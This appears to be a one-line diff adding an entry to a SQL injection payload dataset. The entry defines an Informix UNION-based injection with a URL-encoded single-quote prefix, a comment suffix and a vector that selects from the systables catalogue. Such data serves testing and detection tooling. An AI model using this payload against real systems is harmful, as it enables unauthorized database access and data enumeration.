@@ -1,0 +1,1 @@
+{"dbms": "informix", "technique": "union", "boundary": {"prefix": "%27", "suffix": "-- -", "type": "single-enc"}, "vector": "{B} UNION ALL SELECT NULL,NULL,NULL FROM systables WHERE 1=1", "comment": "informix union: url-enc single"}
